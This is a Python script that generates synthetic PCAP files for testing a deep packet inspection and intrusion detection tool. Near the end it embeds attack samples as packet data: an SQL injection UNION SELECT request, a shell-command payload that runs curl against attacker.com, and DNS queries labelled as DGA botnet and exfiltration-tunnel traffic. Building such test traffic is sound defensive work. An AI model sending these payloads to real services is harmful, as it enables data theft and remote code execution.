#!/usr/bin/env python3
"""
Generate a test PCAP file with various protocols for DPI testing.
Includes TLS Client Hello with SNI, HTTP, DNS, etc.
"""

import os
import struct
import random
import socket

class PCAPWriter:
    def __init__(self, filename):
        self.file = open(filename, 'wb')
        self.write_global_header()
        self.timestamp = 1700000000
        
    def write_global_header(self):
        # Magic, version 2.4, timezone 0, sigfigs 0, snaplen 65535, linktype Ethernet
        header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
        self.file.write(header)
        
    def write_packet(self, data):
        ts_sec = self.timestamp
        ts_usec = random.randint(0, 999999)
        self.timestamp += 1
        
        pkt_header = struct.pack('<IIII', ts_sec, ts_usec, len(data), len(data))
        self.file.write(pkt_header)
        self.file.write(data)
        
    def close(self):
        self.file.close()


def create_ethernet_header(src_mac, dst_mac, ethertype=0x0800):
    return bytes.fromhex(dst_mac.replace(':', '')) + \
           bytes.fromhex(src_mac.replace(':', '')) + \
           struct.pack('>H', ethertype)


def create_ip_header(src_ip, dst_ip, protocol, payload_len, ttl=64):
    version_ihl = 0x45
    tos = 0
    total_len = 20 + payload_len
    ident = random.randint(1, 65535)
    flags_frag = 0x4000  # Don't fragment
    checksum = 0
    
    header = struct.pack('>BBHHHBBH',
                         version_ihl, tos, total_len,
                         ident, flags_frag,
                         ttl, protocol, checksum)
    
    header += bytes([int(x) for x in src_ip.split('.')])
    header += bytes([int(x) for x in dst_ip.split('.')])
    
    return header


def create_ipv6_header(src_ip6, dst_ip6, next_header, payload_len):
    # Version (4) = 6, Traffic Class (8) = 0, Flow Label (20) = 0
    vtc_fl = 0x60000000
    hop_limit = 64
    header = struct.pack('>IHBB', vtc_fl, payload_len, next_header, hop_limit)
    header += socket.inet_pton(socket.AF_INET6, src_ip6)
    header += socket.inet_pton(socket.AF_INET6, dst_ip6)
    return header


def create_tcp_header(src_port, dst_port, seq, ack, flags, payload_len=0, window=65535):
    data_offset = 5 << 4  # 5 * 4 = 20 bytes
    checksum = 0
    urgent = 0
    
    return struct.pack('>HHIIBBHHH',
                       src_port, dst_port,
                       seq, ack,
                       data_offset, flags,
                       window, checksum, urgent)


def create_udp_header(src_port, dst_port, payload_len):
    length = 8 + payload_len
    checksum = 0
    return struct.pack('>HHHH', src_port, dst_port, length, checksum)


def create_tls_client_hello(sni):
    """Create a TLS Client Hello with SNI extension."""
    
    # SNI extension
    sni_bytes = sni.encode('ascii')
    sni_entry = struct.pack('>BH', 0, len(sni_bytes)) + sni_bytes
    sni_list = struct.pack('>H', len(sni_entry)) + sni_entry
    sni_ext = struct.pack('>HH', 0x0000, len(sni_list)) + sni_list
    
    # Supported versions extension (TLS 1.3)
    supported_versions = struct.pack('>HHB', 0x002b, 3, 2) + struct.pack('>H', 0x0304)
    
    # All extensions
    extensions = sni_ext + supported_versions
    extensions_data = struct.pack('>H', len(extensions)) + extensions
    
    # Client Hello body
    client_version = struct.pack('>H', 0x0303)  # TLS 1.2
    random_bytes = bytes([random.randint(0, 255) for _ in range(32)])
    session_id = struct.pack('B', 0)  # No session ID
    cipher_suites = struct.pack('>H', 4) + struct.pack('>HH', 0x1301, 0x1302)  # TLS_AES_128_GCM, TLS_AES_256_GCM
    compression = struct.pack('BB', 1, 0)  # No compression
    
    client_hello_body = client_version + random_bytes + session_id + cipher_suites + compression + extensions_data
    
    # Handshake header
    handshake = struct.pack('B', 0x01)  # Client Hello
    handshake += struct.pack('>I', len(client_hello_body))[1:]  # 3-byte length
    handshake += client_hello_body
    
    # TLS record header
    record = struct.pack('B', 0x16)  # Handshake
    record += struct.pack('>H', 0x0301)  # TLS 1.0 for record layer
    record += struct.pack('>H', len(handshake))
    record += handshake
    
    return record


def create_quic_initial_packet(sni):
    """Create a simulated QUIC Initial packet containing Client Hello with SNI."""
    client_hello = create_tls_client_hello(sni)[5:]  # Raw handshake layer without TLS record header
    
    # QUIC Long Header Initial packet (RFC 9000)
    first_byte = 0xc0  # Form=1, Fixed=1, Type=0 (Initial)
    version = 0x00000001  # QUIC v1
    dcid = bytes([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88])
    scid = bytes([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11])
    token_len = 0
    
    # CRYPTO frame (type 0x06)
    crypto_frame = struct.pack('BBB', 0x06, 0x00, len(client_hello)) + client_hello
    packet_len = len(crypto_frame) + 1  # 1 byte packet number
    
    header = struct.pack('>BIB', first_byte, version, len(dcid)) + dcid
    header += struct.pack('>B', len(scid)) + scid
    header += struct.pack('>BB', token_len, packet_len)
    header += struct.pack('>B', 1)  # Packet number 1
    
    return header + crypto_frame


def create_http_request(host, path='/'):
    return f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: DPI-Test/1.0\r\nAccept: */*\r\n\r\n".encode()


def create_dns_query(domain):
    # Transaction ID
    txid = struct.pack('>H', random.randint(1, 65535))
    # Flags: standard query
    flags = struct.pack('>H', 0x0100)
    # Questions: 1, Answers: 0, Authority: 0, Additional: 0
    counts = struct.pack('>HHHH', 1, 0, 0, 0)
    
    # Question section
    question = b''
    for label in domain.split('.'):
        question += struct.pack('B', len(label)) + label.encode()
    question += struct.pack('B', 0)  # Null terminator
    question += struct.pack('>HH', 1, 1)  # Type A, Class IN
    
    return txid + flags + counts + question


def main():
    repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    data_dir = os.path.join(repo_root, 'data')
    os.makedirs(data_dir, exist_ok=True)
    writer = PCAPWriter(os.path.join(data_dir, 'test_dpi.pcap'))
    
    # Source: User's machine
    user_mac = '00:11:22:33:44:55'
    user_ip = '192.168.1.100'
    
    # Destination: Various servers
    gateway_mac = 'aa:bb:cc:dd:ee:ff'
    
    # Test cases with SNI
    tls_connections = [
        ('142.250.185.206', 'www.google.com', 443),
        ('142.250.185.110', 'www.youtube.com', 443),
        ('157.240.1.35', 'www.facebook.com', 443),
        ('157.240.1.174', 'www.instagram.com', 443),
        ('104.244.42.65', 'twitter.com', 443),
        ('52.94.236.248', 'www.amazon.com', 443),
        ('23.52.167.61', 'www.netflix.com', 443),
        ('140.82.114.4', 'github.com', 443),
        ('104.16.85.20', 'discord.com', 443),
        ('35.186.224.25', 'zoom.us', 443),
        ('35.186.227.140', 'web.telegram.org', 443),
        ('99.86.0.100', 'www.tiktok.com', 443),
        ('35.186.224.47', 'open.spotify.com', 443),
        ('192.0.78.24', 'www.cloudflare.com', 443),
        ('13.107.42.14', 'www.microsoft.com', 443),
        ('17.253.144.10', 'www.apple.com', 443),
        ('104.18.3.1', 'chatgpt.com', 443),
        ('104.18.12.1', 'claude.ai', 443),
        ('151.101.65.140', 'reddit.com', 443),
        ('151.101.2.167', 'twitch.tv', 443),
        ('54.210.12.1', 'slack.com', 443),
    ]
    
    # HTTP connections (unencrypted)
    http_connections = [
        ('93.184.216.34', 'example.com', 80),
        ('185.199.108.153', 'httpbin.org', 80),
    ]
    
    # DNS queries
    dns_queries = [
        'www.google.com',
        'www.youtube.com',
        'www.facebook.com',
        'api.twitter.com',
        'v8n3q1z9k7x2p4m0.biz',  # DGA botnet query
        '48656c6c6f576f726c6453656372657444617461457866696c74726174696f6e.tunnel.c2server.org', # DNS Exfiltration Tunnel
    ]
    
    seq_base = 1000
    
    # Generate TLS packets
    idx = 0
    for dst_ip, sni, dst_port in tls_connections:
        src_port = random.randint(49152, 65535)
        
        # Vary OS fingerprints: macOS (64, 65535), Linux (64, 29200), Windows (128, 64240)
        if idx % 3 == 0:
            client_ttl, client_win = 64, 65535  # macOS / iOS
        elif idx % 3 == 1:
            client_ttl, client_win = 64, 29200  # Linux / Android
        else:
            client_ttl, client_win = 128, 64240 # Windows
        idx += 1
        
        # TCP SYN
        eth = create_ethernet_header(user_mac, gateway_mac)
        tcp = create_tcp_header(src_port, dst_port, seq_base, 0, 0x02, window=client_win)  # SYN
        ip = create_ip_header(user_ip, dst_ip, 6, len(tcp), ttl=client_ttl)
        writer.write_packet(eth + ip + tcp)
        
        # TCP SYN-ACK (from server)
        tcp = create_tcp_header(dst_port, src_port, seq_base + 1000, seq_base + 1, 0x12)  # SYN-ACK
        ip = create_ip_header(dst_ip, user_ip, 6, len(tcp))
        eth = create_ethernet_header(gateway_mac, user_mac)
        writer.write_packet(eth + ip + tcp)
        
        # TCP ACK
        eth = create_ethernet_header(user_mac, gateway_mac)
        tcp = create_tcp_header(src_port, dst_port, seq_base + 1, seq_base + 1001, 0x10)  # ACK
        ip = create_ip_header(user_ip, dst_ip, 6, len(tcp))
        writer.write_packet(eth + ip + tcp)
        
        # TLS Client Hello with SNI
        tls_data = create_tls_client_hello(sni)
        tcp = create_tcp_header(src_port, dst_port, seq_base + 1, seq_base + 1001, 0x18)  # PSH-ACK
        ip = create_ip_header(user_ip, dst_ip, 6, len(tcp) + len(tls_data))
        writer.write_packet(eth + ip + tcp + tls_data)
        
        seq_base += 10000
    
    # Generate HTTP packets
    for dst_ip, host, dst_port in http_connections:
        src_port = random.randint(49152, 65535)
        
        # TCP handshake (simplified - just SYN)
        eth = create_ethernet_header(user_mac, gateway_mac)
        tcp = create_tcp_header(src_port, dst_port, seq_base, 0, 0x02)
        ip = create_ip_header(user_ip, dst_ip, 6, len(tcp))
        writer.write_packet(eth + ip + tcp)
        
        # HTTP request
        http_data = create_http_request(host)
        tcp = create_tcp_header(src_port, dst_port, seq_base + 1, 1, 0x18)
        ip = create_ip_header(user_ip, dst_ip, 6, len(tcp) + len(http_data))
        writer.write_packet(eth + ip + tcp + http_data)
        
        seq_base += 10000
    
    # Generate DNS queries
    dns_server = '8.8.8.8'
    for domain in dns_queries:
        src_port = random.randint(49152, 65535)
        
        dns_data = create_dns_query(domain)
        eth = create_ethernet_header(user_mac, gateway_mac)
        udp = create_udp_header(src_port, 53, len(dns_data))
        ip = create_ip_header(user_ip, dns_server, 17, len(udp) + len(dns_data))
        writer.write_packet(eth + ip + udp + dns_data)
    
    # Add some blocked IP traffic (from a specific source)
    blocked_source_ip = '192.168.1.50'
    for i in range(5):
        src_port = random.randint(49152, 65535)
        dst_ip = '172.217.0.100'
        
        eth = create_ethernet_header('00:11:22:33:44:56', gateway_mac)
        tcp = create_tcp_header(src_port, 443, seq_base, 0, 0x02)
        ip = create_ip_header(blocked_source_ip, dst_ip, 6, len(tcp))
        writer.write_packet(eth + ip + tcp)
        
        seq_base += 1000

    # Add IPv6 TLS traffic (EtherType 0x86DD)
    user_ip6 = '2001:db8::100'
    dst_ip6 = '2607:f8b0:4006:81b::200e'  # Google IPv6
    src_port_v6 = 55123
    tls_v6 = create_tls_client_hello('ipv6.google.com')
    tcp_v6 = create_tcp_header(src_port_v6, 443, seq_base, 1, 0x18)
    ipv6_hdr = create_ipv6_header(user_ip6, dst_ip6, 6, len(tcp_v6) + len(tls_v6))
    eth_v6 = create_ethernet_header(user_mac, gateway_mac, ethertype=0x86DD)
    writer.write_packet(eth_v6 + ipv6_hdr + tcp_v6 + tls_v6)
    seq_base += 10000

    # Add QUIC Initial packet (UDP 443)
    quic_src_port = 56234
    quic_data = create_quic_initial_packet('quic.cloudflare.com')
    udp_quic = create_udp_header(quic_src_port, 443, len(quic_data))
    ip_quic = create_ip_header(user_ip, '104.16.85.20', 17, len(udp_quic) + len(quic_data))
    eth_quic = create_ethernet_header(user_mac, gateway_mac)
    writer.write_packet(eth_quic + ip_quic + udp_quic + quic_data)
    
    # Add packets from CIDR subnet 10.0.0.0/8
    cidr_src_ip = '10.5.4.3'
    eth_cidr = create_ethernet_header('00:11:22:33:44:77', gateway_mac)
    tcp_cidr = create_tcp_header(49999, 80, seq_base, 0, 0x02)
    ip_cidr = create_ip_header(cidr_src_ip, '93.184.216.34', 6, len(tcp_cidr))
    writer.write_packet(eth_cidr + ip_cidr + tcp_cidr)

    # Add Malicious SQL Injection Attack packet (for NIDS Aho-Corasick testing)
    sqli_payload = b"GET /products?cat=1' UNION SELECT username, password FROM accounts-- HTTP/1.1\r\nHost: shop.com\r\n\r\n"
    sqli_tcp = create_tcp_header(48888, 80, seq_base + 100, 1, 0x18)
    sqli_ip = create_ip_header(user_ip, '198.51.100.10', 6, len(sqli_tcp) + len(sqli_payload))
    writer.write_packet(create_ethernet_header(user_mac, gateway_mac) + sqli_ip + sqli_tcp + sqli_payload)

    # Add Malicious RCE Shellcode Attack packet (for NIDS Aho-Corasick testing)
    rce_payload = b"POST /api/exec HTTP/1.1\r\nHost: internal-service.local\r\n\r\nrun=/bin/sh -c 'curl attacker.com'"
    rce_tcp = create_tcp_header(48889, 8080, seq_base + 200, 1, 0x18)
    rce_ip = create_ip_header(user_ip, '198.51.100.20', 6, len(rce_tcp) + len(rce_payload))
    writer.write_packet(create_ethernet_header(user_mac, gateway_mac) + rce_ip + rce_tcp + rce_payload)

    writer.close()
    print(f"Created data/test_dpi.pcap with rich test traffic:")
    print(f"  - {len(tls_connections)} IPv4 TLS connections with SNI (ChatGPT, Claude, Netflix, etc.)")
    print(f"  - 1 IPv6 TLS connection with SNI")
    print(f"  - 1 QUIC/HTTP3 Initial packet on UDP 443")
    print(f"  - {len(http_connections)} HTTP connections")
    print(f"  - {len(dns_queries)} DNS queries")
    print(f"  - 5 packets from blocked IP {blocked_source_ip}")
    print(f"  - 1 packet from CIDR subnet {cidr_src_ip} (10.0.0.0/8)")
    print(f"  - 2 cyber attack packets: SQL Injection (UNION SELECT) and RCE (/bin/sh)")

    # Generate Host 1 PCAP (Streaming & Social: YouTube, Netflix, Twitter)
    h1_writer = PCAPWriter(os.path.join(data_dir, 'host1.pcap'))
    h1_ip = '192.168.10.101'
    h1_mac = '00:11:22:33:AA:01'
    h1_sites = [
        ('142.251.150.206', 'www.youtube.com', 443),
        ('52.37.150.10', 'www.netflix.com', 443),
        ('104.244.42.1', 'twitter.com', 443),
        ('157.240.22.35', 'www.instagram.com', 443),
    ]
    seq_h1 = 5000
    for dst_ip, sni, dst_port in h1_sites:
        src_port = random.randint(49152, 65000)
        eth = create_ethernet_header(h1_mac, gateway_mac)
        tcp_syn = create_tcp_header(src_port, dst_port, seq_h1, 0, 0x02)
        ip = create_ip_header(h1_ip, dst_ip, 6, len(tcp_syn))
        h1_writer.write_packet(eth + ip + tcp_syn)
        
        tls = create_tls_client_hello(sni)
        tcp_data = create_tcp_header(src_port, dst_port, seq_h1 + 1, 1, 0x18)
        ip_data = create_ip_header(h1_ip, dst_ip, 6, len(tcp_data) + len(tls))
        h1_writer.write_packet(eth + ip_data + tcp_data + tls)
        seq_h1 += 1000
    h1_writer.close()
    print("Created data/host1.pcap (Streaming & Social media probe)")

    # Generate Host 2 PCAP (Workplace & AI: ChatGPT, Claude, Slack, GitHub)
    h2_writer = PCAPWriter(os.path.join(data_dir, 'host2.pcap'))
    h2_ip = '192.168.20.202'
    h2_mac = '00:11:22:33:BB:02'
    h2_sites = [
        ('104.18.3.1', 'chatgpt.com', 443),
        ('104.18.12.1', 'claude.ai', 443),
        ('54.210.12.1', 'slack.com', 443),
        ('140.82.121.4', 'github.com', 443),
    ]
    seq_h2 = 9000
    for dst_ip, sni, dst_port in h2_sites:
        src_port = random.randint(49152, 65000)
        eth = create_ethernet_header(h2_mac, gateway_mac)
        tcp_syn = create_tcp_header(src_port, dst_port, seq_h2, 0, 0x02)
        ip = create_ip_header(h2_ip, dst_ip, 6, len(tcp_syn))
        h2_writer.write_packet(eth + ip + tcp_syn)
        
        tls = create_tls_client_hello(sni)
        tcp_data = create_tcp_header(src_port, dst_port, seq_h2 + 1, 1, 0x18)
        ip_data = create_ip_header(h2_ip, dst_ip, 6, len(tcp_data) + len(tls))
        h2_writer.write_packet(eth + ip_data + tcp_data + tls)
        seq_h2 += 1000
    h2_writer.close()
    print("Created data/host2.pcap (Enterprise Workplace & AI probe)")


if __name__ == '__main__':
    main()
